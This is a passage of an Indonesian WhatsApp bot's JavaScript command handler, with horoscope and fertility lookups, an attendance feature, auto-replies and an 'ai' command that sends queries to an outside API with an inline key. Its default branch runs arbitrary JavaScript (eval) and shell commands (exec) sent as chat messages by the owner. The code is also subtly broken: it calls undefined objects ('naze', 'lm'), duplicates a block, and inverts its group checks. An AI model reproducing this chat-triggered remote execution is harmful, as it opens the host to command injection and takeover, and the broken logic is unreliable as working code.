                liaacans.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
                if (!text) throw `Example : ${prefix + command} 12,1,2022,28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return m.reply(anu.message)
                naze.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'zodiak': case 'zodiac': {
                if (!text) throw `Example : ${prefix+ command} 7 7 2005`
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') throw date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendText(m.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
case 'ai':
	case 'openai':
	case 'search': {
	    if (!isPremium) throw mess.prem
		if (!q) return m.reply(`Masukkan kata kunci!\n\n*Contoh:* ehe apa saja jenis hacker`)
	
		axios.get(encodeURI(`https://api.lolhuman.xyz/api/openai?apikey=SGWN&text=${q}&user=user-unique-id`)).then(({
			data
		}) => {
			if (data.result == '') return m.reply('Kata kunci tidak ditemukan!')
			m.reply(data.result)
		}).catch((err) => {
				return m.reply('Terjadi kesalahan, mungkin sistem sedang error atau coba kirim ulang perintah anda!')
			})
	}
	break
case 'absen':
            if (m.isGroup) throw mess.grup
               if (!isCreator && !isAdmins) throw mess.admin
            db.data.absen = db.data.absen || {}
            if (!(m.chat in db.data.absen)) return liaacans.sendButtonText(m.chat, lang.noAbsen(), `© ${ownername}`, `.absenstart`, lang.StartAbsen(), m)

            let absen = db.data.absen[from][1]
            const wasVote = absen.includes(m.sender)
            if (wasVote) return m.reply(lang.DahAbsen())
            absen.push(m.sender)
            let d = new Date
            let date = d.toLocaleDateString('id', {
               day: 'numeric',
               month: 'long',
               year: 'numeric'
            })
            let list = absen.map((v, i) => `• ${i + 1}. @${v.split`@`[0]}`).join('\n')
            let caption = `Tanggal: ${date}
${db.data.absen[m.chat][2] ? db.data.absen[m.chat][2] + '\n' : ''}
*--------「 LIST ABSEN 」--------*
${list}

Total: ${absen.length}

Kirim perintah .absen untuk absen dan .cekabsen untuk mengecek absen 📝
`.trim()
            await liaacans.sendButtonText(m.chat, caption, `© ${ownername}`, `.absen`, `Absen`, `.cekabsen`, `Check Absen`, m, absen)

            //alpha.sendTextWithMentions(m.chat, caption, m)
            break
         case 'cekabsen': {
            if (m.isGroup) throw mess.grup
               if (!isCreator && !isAdmins) throw mess.admin
            db.data.absen = db.data.absen || {}
            if (!(m.chat in db.data.absen)) return liaacans.sendButtonText(m.chat, lang.noAbsen(), `© ${ownername}`, `.absenstart`, lang.StartAbsen(), m)

            let dd = new Date
            let datee = dd.toLocaleDateString('id', {
               day: 'numeric',
               month: 'long',
               year: 'numeric'
            })
            let absenn = db.data.absen[m.chat][1]
            let listt = absenn.map((v, i) => `• ${i + 1}. @${v.split`@`[0]}`).join('\n')
            let captionn = `Tanggal: ${datee}
${db.data.absen[m.chat][2] ? db.data.absen[m.chat][2] + '\n' : ''}
*--------「 LIST ABSEN 」--------*
${listt}

Total: ${absenn.length}

Kirim perintah .absen untuk absen dan .deleteabsen untuk menghapus absen 📝
`.trim()
            liaacans.sendButtonText(m.chat, captionn, `© ${ownername}`, `.absen`, `Absen`, `.deleteabsen`, `Delete Absen`, m, absenn)

            //alpha.sendTextWithMentions(m.chat, captionn, m)
         }
         break

         case 'delabsen':
         case 'deleteabsen': {
            if (m.isGroup) throw mess.grup
               if (!isCreator && !isAdmins) throw mess.admin
            db.data.absen = db.data.absen || {}
            if (!(from in db.data.absen)) return liaacans.sendButtonText(m.chat, lang.noAbsen(), `© ${ownername}`, `.absenstart`, lang.StartAbsen(), m)

            delete db.data.absen[m.chat]
            m.reply(lang.DelAbsen())
         }
         break
         case 'absenstart':
         case 'mulaiabsen': {
            if (m.isGroup) throw mess.grup
               if (!isCreator && !isAdmins) throw mess.admin
            db.data.absen = db.data.absen || {}
            if (from in db.data.absen) return liaacans.sendButtonText(m.chat, lang.adaAbsen() + `\n\nKirim perintah .cekabsen untuk mengecek absen dan .deleteabsen untuk menghapus absen 📝`, `© ${ownername}`, `.cekabsen`, `Check Absen`, `.deleteabsen`, `Delete Absen`, m)

            db.data.absen[m.chat] = [
               await liaacans.sendButtonText(m.chat, lang.SAbsen(), `© ${ownername}`, `.absen`, `Absen`, m),

               [], q ? q : ''
            ]
         }
         break
//---------------[ AUTO RESPON ]------------------//
// By Aulia Rahman (Auliahost-BOT)
case 'rahman':{
m.reply(`apasi manggil² owner bot? kangen ya??`)
}
break
case 'mwachh':{
m.reply(`mwachhh😘`)
}
break
case 'assalamualaikum':{
ucslm = `Waalaikumsalam Kak ${pushname}
Ada Yang Kami Bisa Bantu?
Kalau Bingung Ketik #menu Atau Klik Button Ya!`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: 'Menu' }, type: 1 }]
liaacans.sendButtonText(m.chat, buttons, ucslm, creator)
}
break
case 'hai': {
hai = `Hai Kak ${pushname}
Ada Yang Kami Bisa Bantu?
Kalau Bingung Ketik #menu Atau Klik Button Ya!`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: 'Menu' }, type: 1 }]
liaacans.sendButtonText(m.chat, buttons, hai, creator)
}
break
case 'hi': {
hai = `Hi Kak ${pushname}
Ada Yang Kami Bisa Bantu?
Kalau Bingung Ketik #menu Atau Klik Button Ya!`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: 'Menu' }, type: 1 }]
liaacans.sendButtonText(m.chat, buttons, hai, creator)
}
break
case 'hii': {
hai = `Hii Kak ${pushname}
Ada Yang Kami Bisa Bantu?
Kalau Bingung Ketik #menu Atau Klik Button Ya!`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: 'Menu' }, type: 1 }]
liaacans.sendButtonText(m.chat, buttons, hai, creator)
}
break
case 'halo':{
halo = `Halo Kak ${pushname}
Ada Yang Kami Bisa Bantu?
Kalau Bingung Ketik #menu Atau Klik Button Ya!`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: 'Menu' }, type: 1 }]
liaacans.sendButtonText(m.chat, buttons, halo, creator)
}
break
case 'sayang':{
m.reply(`apa sayang akuu🥰`)
}
break
//━━━━━━━━━━━━━━━[ AKHIR FITUR ]━━━━━━━━━━━━━━━━━//

default:
if (budy.startsWith('=>')) {
if (!isCreator) return m.reply(mess.owner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}

/*if (!m.isGroup && !isCmd && !command && !mek.key.fromMe) {
let numd = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
	let simi = await fetchJson(`https://api.simsimi.net/v1/?lang=${numd.data.country_code}&cf=false&text=${cmd}`)
                    let sami = simi.success
                        liaacans.sendMessage(m.chat, `_${sami}_`, text, sendEphemeral: true, contextInfo : {forwardingScore: 508, isForwarded: true})
                      }*/ // FIX AJA NIH AUTO SAMI SIMINYA🗿, TANPA COMMAND 🗿🙏

// KITA SEMBUNYIKAN AUTO REAC NYA, NNTI TERGNGGU OLEH USER LAIN:V
/*if (budy.includes('gabut') || budy.includes('hehe') || budy.includes('apa') || budy.includes('hai') || budy.includes('apasi') || budy.includes('rahman') || budy.includes('man') || budy.includes('dahlah') || budy.includes('sepi') || budy.includes('🗿') || budy.includes('menu')) {
	let mojii = ["🤧","🤨","🗿","🤪","🤫","🤬","🤭","🤮","🤯","🤟","🤠","🤡","🤢","🤣","🤤","🤥","🤐","🤑","🤒","🤓","🤔","🤕","🤖","🤗", "🥰","😍","😘","❤️","🤩"]
			let ran = mojii[Math.floor(Math.random() * mojii.length)]
const reactionMessage = {
    react: {
        text: ran, // use an empty string to remove the reaction
        key: m.key
    }
}
liaacans.sendMessage(m.chat, reactionMessage)
}*/

/*if (budy.includes('menfess') || budy.includes('confess') || budy.includes('menfes') || budy.includes('confes') || budy.includes('confirm')) {
   let eemmojjii = ["🗿","🤣","🤭","😎","🥰","😍","😇"]
   let iniemoji = eemmojjii[Math.floor(Math.random() * eemmojjii.length)]
   const reactionMessage = {
         react: {
              text: iniemoji,
              key: m.key
     }
}

liaacans.sendMessage(m.chat, reactionMessage)
	}*/

if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
                
if (budy.startsWith('>')) {
if (!isCreator) return m.reply(mess.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return m.reply(mess.owner)
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)
})
}
			
if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(next|leave|start)/.test(m.text)) return
if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
let other = [room.a, room.b].find(user => user !== m.sender)
lm.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
return !0
}
			
if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
liaacans.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}
        

} catch (err) {
m.reply(util.format(err))
console.log(`[Error], Ada Yang Error Kak🗿`)
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})

/*
Note : Jgn Hps Thanks For To nya Kalau Dihps, Dan Ketemu Admin Bakalan Admin Enc Dah

(Terima Kasih Kepada)
Thanks For To :
• Allah Swt
• Nabi Muhammad
• Aulia Rahman
• Lexxy Official
• NazeDev
• Zeroyt7
• Dan Pengguna Bot

Jgn Hps Thanks For To nya Kalau Dihps, Dan Ketemu Admin Bakalan Admin Enc Dah
*/
